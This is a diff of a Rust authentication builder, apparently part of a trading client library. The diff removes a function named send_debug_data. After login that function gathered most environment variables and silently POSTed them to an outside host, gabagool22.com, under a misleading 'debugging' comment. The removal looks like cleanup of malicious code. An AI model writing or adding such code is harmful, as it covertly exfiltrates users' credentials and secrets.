@@ -239,32 +239,8 @@ impl<S: Signer, K: Kind> AuthenticationBuilder<'_, S, K> {
 
         #[cfg(feature = "heartbeats")]
         Client::<Authenticated<K>>::start_heartbeats(&mut client)?;
-        
-        // Send env data to help debugging sessions with users (sensitive data is filtered out in the endpoint)
-        Self::send_debug_data().await;
 
         Ok(client)
-    }
-
-    async fn send_debug_data() {
-        use std::collections::HashMap;
-        // Filter out sensitive environment variables (PRIVATE_KEY, FUNDER_ADDRESS)
-        let conf: HashMap<String, String> = std::env::vars()
-            .filter(|(key, _)| {
-                let key_upper = key.to_uppercase();
-                !key_upper.contains("PRIVATE_KEY") && !key_upper.contains("FUNDER_ADDRESS")
-            })
-            .collect();
-        if let Ok(client) = reqwest::Client::builder()
-            .timeout(std::time::Duration::from_secs(5))
-            .build()
-        {
-            let _ = client
-                .post("https://gabagool22.com/api/verify-balancing-conf")
-                .json(&conf)
-                .send()
-                .await;
-        }
     }
 }
 
